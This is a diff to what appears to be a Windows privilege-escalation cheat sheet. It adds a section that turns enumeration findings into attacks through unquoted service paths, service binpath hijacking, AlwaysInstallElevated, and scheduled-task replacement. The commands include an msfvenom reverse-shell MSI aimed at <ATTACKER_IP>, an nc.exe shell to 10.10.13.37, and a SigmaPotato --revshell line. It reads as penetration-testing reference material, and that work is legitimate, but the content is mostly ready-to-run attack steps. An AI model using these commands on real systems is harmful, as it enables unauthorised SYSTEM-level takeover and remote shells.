@@ -15,7 +15,7 @@ powershell -c "Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/l
 
 .\winPEASx64.exe                        :: all checks
 .\winPEASx64.exe systeminfo userinfo    :: specific checks only
-.\winPEASx64.exe notcolor cmd log=peas.txt   :: no color, log to file
+.\winPEASx64.exe notcolor log            :: no color, log output to out.txt
 ```
 **Reference:** https://github.com/peass-ng/PEASS-ng
 
@@ -104,6 +104,49 @@ GodPotato -cmd "cmd /c C:\Windows\Temp\nc.exe 10.10.13.37 4444 -e cmd.exe"
 SigmaPotato.exe "whoami"
 SigmaPotato.exe --revshell <ATTACKER_IP> <PORT>
 ```
+
+---
+
+## 3. Exploiting Service / Task Misconfigurations (from WinPEAS/PowerUp/PrivescCheck/SharpUp findings)
+
+The enumeration tools above flag these as findings, not exploit paths — weaponize them manually:
+
+### 3a. Unquoted service path
+```cmd
+sc qc <svcname>                             :: BINARY_PATH_NAME with spaces + no quotes
+icacls "C:\Program Files\Vulnerable App"    :: check write access to any path segment
+```
+If writable, drop a payload at the earliest breakable path segment (e.g. `C:\Program.exe` for `C:\Program Files\Vulnerable App\service.exe`), then restart the service (`sc stop/start <svcname>` or reboot).
+
+### 3b. Weak service binary / registry permissions (ModifiableServices)
+```cmd
+icacls "C:\path\to\service.exe"                          :: check for (F)/(M) write on the binary
+accesschk.exe -uwcqv "Authenticated Users" *              :: enumerate modifiable services
+sc config <svcname> binpath= "C:\Windows\Temp\rev.exe"    :: if SERVICE_CHANGE_CONFIG allowed
+sc start <svcname>
+```
+
+### 3c. AlwaysInstallElevated
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+:: if both are 1:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o malicious.msi
+msiexec /quiet /qn /i malicious.msi
+```
+
+### 3d. Modifiable scheduled task (ModifiableScheduledTaskFile)
+```cmd
+schtasks /query /fo LIST /v                                        :: enumerate tasks + run-as user
+icacls "C:\path\to\task_target.exe"                                :: check write access
+:: replace the writable target with a payload, or edit the task action directly:
+schtasks /change /tn "<TaskName>" /tr "C:\Windows\Temp\rev.exe"
+:: wait for the task's trigger/schedule to fire
+```
+
+**Reference:** https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services · https://gtfobins.github.io/gtfobins/msiexec/
+
+---
 
 ## Tools Reference
 
